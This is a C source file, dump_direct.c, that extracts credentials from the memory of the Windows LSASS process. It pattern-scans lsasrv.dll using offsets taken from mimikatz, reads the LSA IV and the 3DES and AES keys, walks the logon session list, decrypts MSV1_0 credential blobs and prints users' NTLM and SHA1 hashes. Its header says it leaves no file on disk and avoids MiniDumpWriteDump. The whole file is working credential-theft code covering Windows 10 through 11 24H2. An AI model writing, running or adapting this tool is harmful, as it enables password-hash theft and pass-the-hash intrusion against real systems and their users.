#pragma comment(lib, "psapi")

/*
 * dump_direct.c — In-memory MSV1_0 credential extraction
 *
 * Pattern scans lsasrv.dll in LSASS for:
 *   1. LsaInitializeProtectedMemory → IV, h3DesKey, hAesKey
 *   2. LogonSessionList → linked list of logon sessions
 *
 * Walks the LogonSessionList, reads encrypted credential blobs,
 * decrypts them using BCrypt (dynamically loaded), and prints
 * NTLM hashes to console.
 *
 * Supports: Windows 10 1607+ / Server 2016+ / Windows 11
 * No files on disk, no MiniDumpWriteDump, no dbghelp.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <psapi.h>
#include "ntdefs.h"
#include "dump.h"

 /* ── Per-build offsets for LsaInitializeProtectedMemory (x64) ────── *
  * From mimikatz kuhl_m_sekurlsa_nt6.c.
  * Each offset is SIGNED and points from the pattern match address to
  * the 4-byte RIP-relative displacement of the target variable.
  * h3DesKey (des_off) is NEGATIVE because its reference is BEFORE the
  * pattern in memory.
  *
  * Resolution:  ref_addr = pat_match + offset
  *              disp     = *(INT32*)ref_addr
  *              target   = ref_addr + 4 + disp
  */
static const LSA_KEY_OFFSETS g_lsa_offsets[] = {
    /* Win10 1507-1803 (build 10240-17134) */
    { 10240, 17134,  61, -73, 16, 0x38 },
    /* Win10 1809-1909 / Server 2019 (build 17763-18363) */
    { 17763, 18363,  67, -89, 16, 0x38 },
    /* Win10 2004-21H2 (build 19041-19044) */
    { 19041, 19045,  67, -89, 16, 0x38 },
    /* Win11 21H2 (build 22000) */
    { 22000, 22000,  67, -89, 16, 0x38 },
    /* Win11 22H2-23H2 (build 22621-22631) */
    { 22621, 22631,  71, -89, 16, 0x38 },
    /* Win11 24H2 (build 26100) */
    { 26100, 26100,  71, -89, 16, 0x38 },
};

static const LSA_KEY_OFFSETS* get_lsa_offsets(DWORD build) {
    for (DWORD i = 0;
        i < sizeof(g_lsa_offsets) / sizeof(g_lsa_offsets[0]); i++) {
        if (build >= g_lsa_offsets[i].build_min &&
            build <= g_lsa_offsets[i].build_max)
            return &g_lsa_offsets[i];
    }
    return NULL;
}

/* ── Per-build LogonSessionList patterns (x64) ──────────────────── *
 * From mimikatz kuhl_m_sekurlsa_utils.c.
 * All use offset 23 from pattern start to the 4-byte RIP-relative
 * displacement pointing to LogonSessionList.
 */
static const BYTE PTRN_WN6x[] =
{ 0x33,0xFF,0x41,0x89,0x37,0x4C,0x8B,0xF3,0x45,0x85,0xC0,0x74 };
static const BYTE PTRN_WN1703[] =
{ 0x33,0xFF,0x45,0x89,0x37,0x48,0x8B,0xF3,0x45,0x85,0xC9,0x74 };
static const BYTE PTRN_WN1803[] =
{ 0x33,0xFF,0x41,0x89,0x37,0x4C,0x8B,0xF3,0x45,0x85,0xC9,0x74 };
static const BYTE PTRN_WN11[] =
{ 0x45,0x89,0x34,0x24,0x4C,0x8B,0xFF,0x8B,0xF3,0x45,0x85,0xC0,0x74 };

static const LSA_LOGON_PATTERN_ENTRY g_logon_patterns[] = {
    /* Win10 1507-1607 (build 10240-14393) — WN6x */
    { 10240, 14393, PTRN_WN6x,   12, 23, -4 },
    /* Win10 1703 (build 15063) */
    { 15063, 15063, PTRN_WN1703, 12, 23, -4 },
    /* Win10 1709-1809 / Server 2019 (build 16299-17763) — WN1803 */
    { 16299, 17763, PTRN_WN1803, 12, 23, -4 },
    /* Win10 1903-21H2 (build 18362-19045) — WN6x */
    { 18362, 19045, PTRN_WN6x,   12, 23, -4 },
    /* Win11 21H2 (build 22000) — WN6x */
    { 22000, 22000, PTRN_WN6x,   12, 23, -4 },
    /* Win11 22H2+ (build 22621-26100) — WN11 */
    { 22621, 26100, PTRN_WN11,   13, 24, -4 },
};

static const LSA_LOGON_PATTERN_ENTRY* get_logon_pattern(DWORD build) {
    for (DWORD i = 0;
        i < sizeof(g_logon_patterns) / sizeof(g_logon_patterns[0]); i++) {
        if (build >= g_logon_patterns[i].build_min &&
            build <= g_logon_patterns[i].build_max)
            return &g_logon_patterns[i];
    }
    return NULL;
}

/* ── BCrypt types (dynamically resolved) ─────────────────────────── */

typedef PVOID BCRYPT_ALG_HANDLE;
typedef PVOID BCRYPT_KEY_HANDLE;
typedef LONG  NTSTATUS_BC;

typedef NTSTATUS_BC(WINAPI* pBCryptOpenAlgorithmProvider)(
    BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);
typedef NTSTATUS_BC(WINAPI* pBCryptSetProperty)(
    BCRYPT_ALG_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
typedef NTSTATUS_BC(WINAPI* pBCryptGenerateSymmetricKey)(
    BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG,
    PUCHAR, ULONG, ULONG);
typedef NTSTATUS_BC(WINAPI* pBCryptDecrypt)(
    BCRYPT_KEY_HANDLE, PUCHAR, ULONG, PVOID, PUCHAR, ULONG,
    PUCHAR, ULONG, ULONG*, ULONG);
typedef NTSTATUS_BC(WINAPI* pBCryptDestroyKey)(BCRYPT_KEY_HANDLE);
typedef NTSTATUS_BC(WINAPI* pBCryptCloseAlgorithmProvider)(
    BCRYPT_ALG_HANDLE, ULONG);

static struct {
    HMODULE hMod;
    pBCryptOpenAlgorithmProvider OpenAlg;
    pBCryptSetProperty          SetProp;
    pBCryptGenerateSymmetricKey GenKey;
    pBCryptDecrypt              Decrypt;
    pBCryptDestroyKey           DestroyKey;
    pBCryptCloseAlgorithmProvider CloseAlg;
} g_bc;

static BOOL load_bcrypt(void) {
    g_bc.hMod = LoadLibraryW(L"bcrypt.dll");
    if (!g_bc.hMod) return FALSE;

    g_bc.OpenAlg = (pBCryptOpenAlgorithmProvider)(void*)
        GetProcAddress(g_bc.hMod, "BCryptOpenAlgorithmProvider");
    g_bc.SetProp = (pBCryptSetProperty)(void*)
        GetProcAddress(g_bc.hMod, "BCryptSetProperty");
    g_bc.GenKey = (pBCryptGenerateSymmetricKey)(void*)
        GetProcAddress(g_bc.hMod, "BCryptGenerateSymmetricKey");
    g_bc.Decrypt = (pBCryptDecrypt)(void*)
        GetProcAddress(g_bc.hMod, "BCryptDecrypt");
    g_bc.DestroyKey = (pBCryptDestroyKey)(void*)
        GetProcAddress(g_bc.hMod, "BCryptDestroyKey");
    g_bc.CloseAlg = (pBCryptCloseAlgorithmProvider)(void*)
        GetProcAddress(g_bc.hMod, "BCryptCloseAlgorithmProvider");

    return (g_bc.OpenAlg && g_bc.SetProp && g_bc.GenKey &&
        g_bc.Decrypt && g_bc.DestroyKey && g_bc.CloseAlg);
}

/* ── NtReadVirtualMemory wrapper ─────────────────────────────────── */

static pNtReadVirtualMemory g_NtRead = NULL;

static BOOL rpm(HANDLE hProc, ULONG_PTR addr, PVOID buf, SIZE_T size) {
    SIZE_T bytes_read = 0;
    NTSTATUS st = g_NtRead(hProc, (PVOID)addr, buf, size, &bytes_read);
    return NT_SUCCESS(st) && (bytes_read == size);
}

/* Read a UNICODE_STRING from remote process */
static BOOL read_unicode_string(HANDLE hProc, ULONG_PTR ustr_addr,
    WCHAR* out, DWORD max_chars) {
    /* UNICODE_STRING: USHORT Length, USHORT MaxLength, PWSTR Buffer */
    BYTE ustr[16];  /* 16 bytes on x64 */
    if (!rpm(hProc, ustr_addr, ustr, 16)) return FALSE;

    USHORT len = *(USHORT*)(ustr + 0);  /* in bytes */
    ULONG_PTR buf = *(ULONG_PTR*)(ustr + 8);

    if (len == 0 || buf == 0 || len > 512) {
        out[0] = 0;
        return TRUE;  /* empty string is valid */
    }

    DWORD chars = len / sizeof(WCHAR);
    if (chars >= max_chars) chars = max_chars - 1;

    if (!rpm(hProc, buf, out, chars * sizeof(WCHAR))) return FALSE;
    out[chars] = 0;
    return TRUE;
}

/* ── Pattern scanner ─────────────────────────────────────────────── */

/* Scan a remote module for a byte pattern */
static ULONG_PTR pattern_scan(HANDLE hProc, ULONG_PTR base, DWORD size,
    const BYTE* pattern, DWORD pat_len) {
    /* Read the module into local memory for scanning */
    BYTE* local = (BYTE*)malloc(size);
    if (!local) return 0;

    SIZE_T bytes_read = 0;
    g_NtRead(hProc, (PVOID)base, local, size, &bytes_read);
    if (bytes_read < pat_len) {
        free(local);
        return 0;
    }

    for (DWORD i = 0; i <= (DWORD)bytes_read - pat_len; i++) {
        if (memcmp(local + i, pattern, pat_len) == 0) {
            ULONG_PTR result = base + i;
            free(local);
            return result;
        }
    }

    free(local);
    return 0;
}

/* ── LSA crypto key extraction ───────────────────────────────────── */

typedef struct {
    BYTE iv[16];
    BYTE des3_key[24];
    BYTE aes_key[32];
    DWORD des3_key_len;
    DWORD aes_key_len;
} LSA_KEYS;

/* Read a BCRYPT hard key from remote process:
 * handle_addr → KIWI_BCRYPT_HANDLE_KEY.key → KIWI_BCRYPT_KEY81.hardkey
 * hardkey_off = offset to KIWI_HARD_KEY within KIWI_BCRYPT_KEY81 (0x38 for Win10+) */
static BOOL read_bcrypt_key(HANDLE hProc, ULONG_PTR handle_addr,
    DWORD hardkey_off,
    BYTE* key_out, DWORD* key_len) {
    /* handle_addr is a pointer to the handle structure */
    ULONG_PTR handle_ptr = 0;
    if (!rpm(hProc, handle_addr, &handle_ptr, sizeof(handle_ptr)))
        return FALSE;

    /* Read the key pointer at +0x10 */
    ULONG_PTR key81_ptr = 0;
    if (!rpm(hProc, handle_ptr + BCRYPT_HANDLE_KEY_PTR, &key81_ptr,
        sizeof(key81_ptr)))
        return FALSE;

    /* Verify MSSK tag at +0x04 */
    ULONG32 tag = 0;
    if (!rpm(hProc, key81_ptr + BCRYPT_KEY81_TAG, &tag, sizeof(tag)))
        return FALSE;
    if (tag != BCRYPT_TAG_MSSK) {
        printf("[-] Bad BCRYPT key tag: 0x%08X (expected MSSK)\n", tag);
        return FALSE;
    }

    /* Read hard key: cbSecret at hardkey_off, data at hardkey_off+4 */
    ULONG32 cb = 0;
    if (!rpm(hProc, key81_ptr + hardkey_off + HARDKEY_CBSECRET,
        &cb, sizeof(cb)))
        return FALSE;

    if (cb > 32) {
        printf("[-] Key too large: %u bytes\n", cb);
        return FALSE;
    }

    if (!rpm(hProc, key81_ptr + hardkey_off + HARDKEY_DATA,
        key_out, cb))
        return FALSE;

    *key_len = cb;
    return TRUE;
}

/* Resolve a reference via mimikatz-style signed offset:
 *   ref_addr = pat_addr + offset
 *   disp     = *(INT32*)(ref_addr)    — 4-byte RIP-relative displacement
 *   target   = ref_addr + 4 + disp
 */
static ULONG_PTR resolve_offset_ref(HANDLE hProc, ULONG_PTR pat_addr,
    INT32 offset) {
    ULONG_PTR ref_addr = (ULONG_PTR)((LONG_PTR)pat_addr + offset);
    INT32 disp = 0;
    if (!rpm(hProc, ref_addr, &disp, 4)) return 0;
    return ref_addr + 4 + disp;
}

static BOOL extract_lsa_keys(HANDLE hProc, ULONG_PTR lsasrv_base,
    DWORD lsasrv_size, DWORD build,
    LSA_KEYS* keys) {
    printf("[*] Scanning lsasrv.dll for crypto keys (build %lu)...\n", build);

    /* Look up per-build offsets */
    const LSA_KEY_OFFSETS* offsets = get_lsa_offsets(build);
    if (!offsets) {
        printf("[-] No LSA key offsets for build %lu\n", build);
        printf("    Supported: 10240-26100 (Win10 1507+ / Win11 24H2)\n");
        return FALSE;
    }
    printf("[+] Using offset table: IV=%d, 3DES=%d, AES=%d, hardkey=0x%lX\n",
        offsets->iv_off, offsets->des_off, offsets->aes_off,
        offsets->hardkey_off);

    /* Find LsaInitializeProtectedMemory pattern */
    ULONG_PTR pat_addr = pattern_scan(hProc, lsasrv_base, lsasrv_size,
        (const BYTE*)LSA_CRYPTO_PATTERN, LSA_CRYPTO_PATTERN_LEN);

    if (!pat_addr) {
        printf("[-] LsaInitializeProtectedMemory pattern not found\n");
        return FALSE;
    }
    printf("[+] Crypto pattern at 0x%llX\n", (unsigned long long)pat_addr);

    /* ── Resolve InitializationVector ──
     * ref_addr = pat_addr + iv_off  →  reads 4-byte disp
     * iv_addr  = ref_addr + 4 + disp
     */
    ULONG_PTR iv_addr = resolve_offset_ref(hProc, pat_addr, offsets->iv_off);
    if (!iv_addr) {
        printf("[-] Failed to resolve IV address\n");
        return FALSE;
    }
    printf("[+] IV address: 0x%llX\n", (unsigned long long)iv_addr);

    if (!rpm(hProc, iv_addr, keys->iv, 16)) {
        printf("[-] Failed to read IV\n");
        return FALSE;
    }

    /* ── Resolve h3DesKey ──
     * des_off is NEGATIVE — the reference is BEFORE the pattern.
     * target is a pointer to the BCRYPT handle structure.
     */
    ULONG_PTR des3_handle = resolve_offset_ref(hProc, pat_addr,
        offsets->des_off);
    if (!des3_handle) {
        printf("[-] Failed to resolve h3DesKey address\n");
        return FALSE;
    }
    printf("[+] h3DesKey handle at: 0x%llX\n",
        (unsigned long long)des3_handle);

    if (!read_bcrypt_key(hProc, des3_handle, offsets->hardkey_off,
        keys->des3_key, &keys->des3_key_len)) {
        printf("[-] Failed to read 3DES key\n");
        return FALSE;
    }

    /* ── Resolve hAesKey ── */
    ULONG_PTR aes_handle = resolve_offset_ref(hProc, pat_addr,
        offsets->aes_off);
    if (!aes_handle) {
        printf("[-] Failed to resolve hAesKey address\n");
        return FALSE;
    }
    printf("[+] hAesKey handle at: 0x%llX\n",
        (unsigned long long)aes_handle);

    if (!read_bcrypt_key(hProc, aes_handle, offsets->hardkey_off,
        keys->aes_key, &keys->aes_key_len)) {
        printf("[-] Failed to read AES key\n");
        return FALSE;
    }

    printf("[+] Keys extracted: IV(16) 3DES(%lu) AES(%lu)\n",
        keys->des3_key_len, keys->aes_key_len);
    return TRUE;
}

/* ── Decryption ──────────────────────────────────────────────────── */

static BOOL decrypt_blob(const BYTE* encrypted, DWORD enc_len,
    const LSA_KEYS* keys,
    BYTE** decrypted, DWORD* dec_len) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BOOL result = FALSE;

    const BYTE* key_data;
    DWORD key_len;
    LPCWSTR alg_id;
    LPCWSTR chain_mode;
    BYTE iv_copy[16];
    DWORD iv_len;

    if (enc_len % 8 == 0 && enc_len < 200000) {
        /* 3DES-CBC: IV is first 8 bytes */
        alg_id = L"3DES";
        chain_mode = L"ChainingModeCBC";
        key_data = keys->des3_key;
        key_len = keys->des3_key_len;
        memcpy(iv_copy, keys->iv, 8);
        iv_len = 8;
    }
    else {
        /* AES-CFB: full 16-byte IV */
        alg_id = L"AES";
        chain_mode = L"ChainingModeCFB";
        key_data = keys->aes_key;
        key_len = keys->aes_key_len;
        memcpy(iv_copy, keys->iv, 16);
        iv_len = 16;
    }

    if (g_bc.OpenAlg(&hAlg, alg_id, NULL, 0) != 0)
        return FALSE;

    if (g_bc.SetProp(hAlg, L"ChainingMode",
        (PUCHAR)chain_mode,
        (ULONG)((wcslen(chain_mode) + 1) * sizeof(WCHAR)),
        0) != 0) {
        g_bc.CloseAlg(hAlg, 0);
        return FALSE;
    }

    if (g_bc.GenKey(hAlg, &hKey, NULL, 0,
        (PUCHAR)key_data, key_len, 0) != 0) {
        g_bc.CloseAlg(hAlg, 0);
        return FALSE;
    }

    *decrypted = (BYTE*)malloc(enc_len);
    if (!*decrypted) goto cleanup;

    ULONG out_len = 0;
    if (g_bc.Decrypt(hKey, (PUCHAR)encrypted, enc_len,
        NULL, iv_copy, iv_len,
        *decrypted, enc_len, &out_len, 0) != 0) {
        free(*decrypted);
        *decrypted = NULL;
        goto cleanup;
    }

    *dec_len = out_len;
    result = TRUE;

cleanup:
    if (hKey) g_bc.DestroyKey(hKey);
    if (hAlg) g_bc.CloseAlg(hAlg, 0);
    return result;
}

/* ── MSV1_0 offset table ─────────────────────────────────────────── */

static const MSV_LIST_OFFSETS g_msv_offsets[] = {
    /* Win10 1607 - 1909 / Server 2016-2019 (KIWI_MSV1_0_LIST_63)
     * LUID=0x70, UserName=0x90, Domaine=0xA0, Credentials=0x108
     * Source: mimikatz KIWI_MSV1_0_LIST_63 struct, confirmed by
     * matteomalvica WinDbg analysis and skelsec research */
    { 14393, 18363, 0x070, 0x090, 0x0A0, 0x108 },
    /* Win10 2004+ / Win11 / Server 2022 (KIWI_MSV1_0_LIST_63)
     * Same struct layout as above — offsets stable through 26100 */
    { 19041, 26100, 0x070, 0x090, 0x0A0, 0x108 },
};

static const MSV_LIST_OFFSETS* get_msv_offsets(DWORD build) {
    for (DWORD i = 0; i < sizeof(g_msv_offsets) / sizeof(g_msv_offsets[0]); i++) {
        if (build >= g_msv_offsets[i].build_min &&
            build <= g_msv_offsets[i].build_max)
            return &g_msv_offsets[i];
    }
    return NULL;
}

/* ── Credential walking ──────────────────────────────────────────── */

static void print_hex(const BYTE* data, DWORD len) {
    for (DWORD i = 0; i < len; i++)
        printf("%02x", data[i]);
}

static void walk_credentials(HANDLE hProc, ULONG_PTR list_head,
    const MSV_LIST_OFFSETS* offsets,
    const LSA_KEYS* keys) {
    ULONG_PTR flink = 0;
    if (!rpm(hProc, list_head, &flink, sizeof(flink))) {
        printf("[-] Failed to read LogonSessionList head\n");
        return;
    }

    int session_count = 0;
    int cred_count = 0;
    ULONG_PTR current = flink;

    /* Walk the doubly-linked list */
    while (current != 0 && current != list_head) {
        session_count++;
        if (session_count > 256) break;  /* safety limit */

        /* Read LogonId (LUID, 8 bytes) */
        LUID logon_id = { 0 };
        rpm(hProc, current + offsets->logonid, &logon_id, sizeof(logon_id));

        /* Read UserName UNICODE_STRING */
        WCHAR username[128] = { 0 };
        read_unicode_string(hProc, current + offsets->username,
            username, 128);

        /* Read Domain UNICODE_STRING */
        WCHAR domain[128] = { 0 };
        read_unicode_string(hProc, current + offsets->domain,
            domain, 128);

        /* Follow credentials pointer chain */
        ULONG_PTR cred_ptr = 0;
        rpm(hProc, current + offsets->credentials, &cred_ptr, sizeof(cred_ptr));

        printf("  [DBG] session %d: LUID=%lu:%lu user=%ls dom=%ls cred_ptr=0x%llX\n",
            session_count, logon_id.HighPart, logon_id.LowPart,
            username, domain, (unsigned long long)cred_ptr);

        while (cred_ptr != 0) {
            /* Read primary credentials pointer at cred_ptr + 0x10 */
            ULONG_PTR primary_ptr = 0;
            rpm(hProc, cred_ptr + MSV_CRED_PRIMARY_PTR,
                &primary_ptr, sizeof(primary_ptr));

            printf("  [DBG]   primary_ptr=0x%llX\n", (unsigned long long)primary_ptr);

            while (primary_ptr != 0) {
                /* Read encrypted blob: UNICODE_STRING at primary_ptr + 0x18 */
                BYTE ustr[16];
                if (rpm(hProc, primary_ptr + MSV_PCRED_CREDS_USTR, ustr, 16)) {
                    USHORT blob_len = *(USHORT*)(ustr + 0);
                    ULONG_PTR blob_buf = *(ULONG_PTR*)(ustr + 8);

                    if (blob_len > 0 && blob_buf != 0) {
                        /* Read encrypted blob */
                        BYTE* enc = (BYTE*)malloc(blob_len);
                        if (enc && rpm(hProc, blob_buf, enc, blob_len)) {
                            /* Decrypt */
                            BYTE* dec = NULL;
                            DWORD dec_len = 0;

                            if (decrypt_blob(enc, blob_len, keys,
                                &dec, &dec_len)) {
                                /* Extract hashes from decrypted credential blob */
                                if (dec_len >= DECRYPTED_MIN_SIZE) {
                                    BOOL has_ntlm = dec[DECRYPTED_NTOWF_FLAG] != 0;
                                    BOOL has_sha = dec[DECRYPTED_SHA_FLAG] != 0;

                                    if (has_ntlm || has_sha) {
                                        printf("\n  [+] %ls\\%ls (LUID: %lu:%lu)\n",
                                            domain, username,
                                            logon_id.HighPart,
                                            logon_id.LowPart);
                                        if (has_ntlm) {
                                            printf("      NTLM: ");
                                            print_hex(dec + DECRYPTED_NTOWF_HASH, 16);
                                            printf("\n");
                                        }
                                        if (has_sha) {
                                            printf("      SHA1: ");
                                            print_hex(dec + DECRYPTED_SHA_HASH, 20);
                                            printf("\n");
                                        }
                                        cred_count++;
                                    }
                                }
                                free(dec);
                            }
                        }
                        if (enc) free(enc);
                    }
                }

                /* Next primary creds entry */
                ULONG_PTR next_primary = 0;
                rpm(hProc, primary_ptr + MSV_PCRED_NEXT,
                    &next_primary, sizeof(next_primary));
                primary_ptr = next_primary;
            }

            /* Next credentials entry */
            ULONG_PTR next_cred = 0;
            rpm(hProc, cred_ptr + MSV_CRED_NEXT, &next_cred, sizeof(next_cred));
            cred_ptr = next_cred;
        }

        /* Next list entry (Flink at offset 0) */
        ULONG_PTR next = 0;
        rpm(hProc, current, &next, sizeof(next));
        current = next;
    }

    printf("\n[*] Walked %d sessions, found %d credential sets\n",
        session_count, cred_count);
}

/* ── Find lsasrv.dll in target process ───────────────────────────── */

static BOOL find_lsasrv(HANDLE hProc, ULONG_PTR* base, DWORD* size) {
    HMODULE mods[1024];
    DWORD needed = 0;

    if (!EnumProcessModulesEx(hProc, mods, sizeof(mods), &needed,
        LIST_MODULES_ALL))
        return FALSE;

    DWORD n = needed / sizeof(HMODULE);
    for (DWORD i = 0; i < n; i++) {
        WCHAR name[MAX_PATH];
        if (GetModuleBaseNameW(hProc, mods[i], name, MAX_PATH)) {
            if (_wcsicmp(name, L"lsasrv.dll") == 0) {
                MODULEINFO mi = { 0 };
                if (GetModuleInformation(hProc, mods[i], &mi, sizeof(mi))) {
                    *base = (ULONG_PTR)mi.lpBaseOfDll;
                    *size = mi.SizeOfImage;
                    return TRUE;
                }
            }
        }
    }
    return FALSE;
}

/* ── Main entry point ────────────────────────────────────────────── */

BOOL dump_direct(DWORD pid) {
    printf("[*] Direct mode: extracting credentials from PID %lu\n", pid);

    /* Resolve NtReadVirtualMemory */
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    g_NtRead = (pNtReadVirtualMemory)(void*)GetProcAddress(ntdll,
        "NtReadVirtualMemory");
    if (!g_NtRead) {
        printf("[-] Failed to resolve NtReadVirtualMemory\n");
        return FALSE;
    }

    /* Load BCrypt */
    if (!load_bcrypt()) {
        printf("[-] Failed to load bcrypt.dll\n");
        return FALSE;
    }

    /* Get OS build for MSV offsets */
    pRtlGetVersion RtlGetVersion =
        (pRtlGetVersion)(void*)GetProcAddress(ntdll, "RtlGetVersion");
    RTL_OSVERSIONINFOW vi = { 0 };
    vi.dwOSVersionInfoSize = sizeof(vi);
    RtlGetVersion(&vi);

    const MSV_LIST_OFFSETS* msv_off = get_msv_offsets(vi.dwBuildNumber);
    if (!msv_off) {
        printf("[-] Unsupported build %lu for direct credential extraction\n",
            vi.dwBuildNumber);
        printf("    Supported: 14393-26100 (Win10 1607+ / Win11 24H2)\n");
        return FALSE;
    }

    /* Open target process */
    HANDLE hProc = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProc) {
        printf("[-] OpenProcess failed: %lu\n", GetLastError());
        return FALSE;
    }

    /* Find lsasrv.dll */
    ULONG_PTR lsasrv_base = 0;
    DWORD lsasrv_size = 0;
    if (!find_lsasrv(hProc, &lsasrv_base, &lsasrv_size)) {
        printf("[-] lsasrv.dll not found in PID %lu (is this LSASS?)\n", pid);
        CloseHandle(hProc);
        return FALSE;
    }
    printf("[+] lsasrv.dll at 0x%llX (size: 0x%lX)\n",
        (unsigned long long)lsasrv_base, lsasrv_size);

    /* Extract crypto keys */
    LSA_KEYS keys = { 0 };
    if (!extract_lsa_keys(hProc, lsasrv_base, lsasrv_size,
        vi.dwBuildNumber, &keys)) {
        CloseHandle(hProc);
        return FALSE;
    }

    /* Find LogonSessionList using per-build pattern */
    printf("[*] Scanning for LogonSessionList...\n");
    const LSA_LOGON_PATTERN_ENTRY* logon_pe = get_logon_pattern(vi.dwBuildNumber);
    if (!logon_pe) {
        printf("[-] No LogonSessionList pattern for build %lu\n",
            vi.dwBuildNumber);
        CloseHandle(hProc);
        return FALSE;
    }

    ULONG_PTR logon_pat = pattern_scan(hProc, lsasrv_base, lsasrv_size,
        logon_pe->pattern, logon_pe->pat_len);

    if (!logon_pat) {
        printf("[-] LogonSessionList pattern not found\n");
        CloseHandle(hProc);
        return FALSE;
    }

    /* Resolve LogonSessionList via signed offset table */
    ULONG_PTR logon_list = resolve_offset_ref(hProc, logon_pat,
        logon_pe->list_off);
    if (!logon_list) {
        printf("[-] Failed to resolve LogonSessionList address\n");
        CloseHandle(hProc);
        return FALSE;
    }
    printf("[+] LogonSessionList at 0x%llX\n",
        (unsigned long long)logon_list);

    /* Resolve LogonSessionListCount — number of list heads.
     * LogonSessionList is an ARRAY of LIST_ENTRY heads, not a single one.
     * Mimikatz iterates LogonSessionList[0..count-1]. */
    ULONG nb_lists = 1;
    ULONG_PTR count_addr = resolve_offset_ref(hProc, logon_pat,
        logon_pe->count_off);
    if (count_addr) {
        rpm(hProc, count_addr, &nb_lists, sizeof(nb_lists));
        if (nb_lists == 0 || nb_lists > 256) nb_lists = 1;
    }
    printf("[+] LogonSessionListCount = %lu\n", nb_lists);

    /* Walk sessions and extract credentials */
    printf("[*] Walking logon sessions...\n");
    printf("  ============================================\n");

    /* Walk each list head — each LIST_ENTRY is 16 bytes (Flink+Blink) */
    for (ULONG li = 0; li < nb_lists; li++) {
        ULONG_PTR list_head = logon_list + li * (2 * sizeof(ULONG_PTR));
        walk_credentials(hProc, list_head, msv_off, &keys);
    }

    printf("  ============================================\n");

    CloseHandle(hProc);
    return TRUE;
}